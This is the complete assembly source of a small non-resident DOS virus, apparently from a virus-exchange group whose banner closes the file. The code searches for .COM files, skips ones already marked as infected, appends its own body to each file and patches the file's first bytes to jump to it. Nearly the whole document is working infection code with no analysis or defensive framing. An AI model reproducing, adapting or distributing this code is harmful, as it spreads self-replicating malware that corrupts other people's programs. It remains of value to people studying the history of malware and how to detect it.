;****************************************************************************
;*              Mini non-resident virus
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

                .RADIX  16

FILELEN         equ     eind - start
FILNAM          equ     69


;****************************************************************************
;*              Dummy program (infected)
;****************************************************************************

                org     100h

begin:          db      4Dh
                db      0E9, 4, 0


;****************************************************************************
;*              Begin of the virus
;****************************************************************************


start:          db      0CDh,  20h, 0, 0

                push    si                      ;si=0100

                mov     di,si
                add     si,[si+2]               ;si=0104
                push    si
                movsw
                movsw
                pop     si                      ;si -> start (buffer)

                mov     dh,0FF                  ;set DTA to FF80
                call    setDTA

                lea     dx,[si+FILNAM]          ;dx -> filename
                mov     ah,4Eh                  ;find first file
infloop:        int     21
                cwd                             ;set DTA to 0080 and quit
                jc      setDTA

                mov     dx,0FF9Eh
                mov     ax,3D02h                ;open the file
                call    int21
                jc      exit1
                xchg    bx,ax

                mov     ah,3fh                  ;read begin of file
                int     21

                cmp     byte ptr [si],4Dh       ;EXE or infected COM?
                je      exit2

                mov     al,2                    ;go to end of file
                call    seek
                xchg    ax,di

                mov     cl,FILELEN              ;write program to end of file
                mov     ah,40h
                int     21

                mov     al,0
                call    seek
                mov     word ptr [si],0E94Dh
                mov     word ptr [si+2],di


                mov     ah,40h
                int     21

exit2:          mov     ah,3Eh                  ;close the file
                int     21

exit1:          mov     ah,4Fh                  ;find next file
                jmp     short infloop

setDTA:         mov     dl,80
                mov     ah,1A
                int     21
                ret

seek:           mov     ah,42
                cwd
int21:          xor     cx,cx
                int     21
                mov     cl,04
                mov     dx,si

return:         ret


;****************************************************************************
;*              Data
;****************************************************************************

filename        db      '*.COM',0

eind:

cseg            ends
                end     begin

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴�> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <컴컴컴컴컴컴컴�
;  컴컴컴컴컴�> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
